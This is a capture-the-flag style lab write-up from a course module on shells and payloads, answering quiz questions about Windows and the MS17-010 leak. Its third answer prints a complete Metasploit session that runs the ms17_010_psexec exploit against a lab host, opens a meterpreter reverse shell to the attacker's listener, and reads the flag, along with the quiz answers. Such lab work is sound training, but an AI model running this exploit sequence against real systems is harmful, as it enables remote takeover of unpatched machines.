# Section 09: Infiltrating Windows

Module: 08. Shells & Payloads

---

## Questions & Answers

### 1. What file type is a text-based DOS script used to perform tasks from the cli? (answer with the file extension, e.g. '.something')

**Answer:** `.bat`

---

### 2. What Windows exploit was dropped as a part of the Shadow Brokers leak? (Format: ms bulletin number, e.g. MSxx-xxx)

Context: [Article](https://www.rapid7.com/blog/post/2017/04/18/the-shadow-brokers-leaked-exploits-faq/)

**Answer:** `MS17-010`

---

### 3. Gain a shell on the vulnerable target, then submit the contents of the flag.txt file that can be found in C:\

Context:
```bash
[msf](Jobs:0 Agents:0) >> use exploit/windows/smb/ms17_010_psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> show options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                            Required  Description
   ----                  ---------------                            --------  -----------
   DBGTRACE              false                                      yes       Show extra debug trace info
   LEAKATTEMPTS          99                                         yes       How many times to try to leak transaction
   NAMEDPIPE                                                        no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/word  yes       List of named pipes to check
                         lists/named_pipes.txt
   RHOSTS                                                           yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/b
                                                                              asics/using-metasploit.html
   RPORT                 445                                        yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                              no        Service description to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                             no        The service display name
   SERVICE_NAME                                                     no        The service name
   SHARE                 ADMIN$                                     yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal
                                                                              read/write folder share
   SMBDomain             .                                          no        The Windows domain to use for authentication
   SMBPass                                                          no        The password for the specified username
   SMBUser                                                          no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     95.111.194.203   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set LHOST 10.10.15.239
LHOST => 10.10.15.239
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set RHOSTS 10.129.145.225
RHOSTS => 10.129.145.225
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> exploit
[*] Started reverse TCP handler on 10.10.15.239:4444 
[*] 10.129.145.225:445 - Target OS: Windows Server 2016 Standard 14393
[*] 10.129.145.225:445 - Built a write-what-where primitive...
[+] 10.129.145.225:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.129.145.225:445 - Selecting PowerShell target
[*] 10.129.145.225:445 - Executing the payload...
[+] 10.129.145.225:445 - Service start timed out, OK if running a command or non-service executable...
[*] Exploit completed, but no session was created.
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set LHOST 10.10.15.239
LHOST => 10.10.15.239
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set LPORT 4444
LPORT => 4444
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> exploit
[*] Started reverse TCP handler on 10.10.15.239:4444 
[*] 10.129.145.225:445 - Target OS: Windows Server 2016 Standard 14393
[*] 10.129.145.225:445 - Built a write-what-where primitive...
[+] 10.129.145.225:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.129.145.225:445 - Selecting PowerShell target
[*] 10.129.145.225:445 - Executing the payload...
[+] 10.129.145.225:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (232006 bytes) to 10.129.145.225
[*] Meterpreter session 1 opened (10.10.15.239:4444 -> 10.129.145.225:49672) at 2026-07-29 04:50:25 -0400

(Meterpreter 1)(C:\Windows\system32) > shell
Process 680 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>type C:\flag.txt
type C:\flag.txt
EB-Still-W0rk$
C:\Windows\system32>
```

**Answer:** `EB-Still-W0rk$`

---

[Back to Module Index](./README.md)
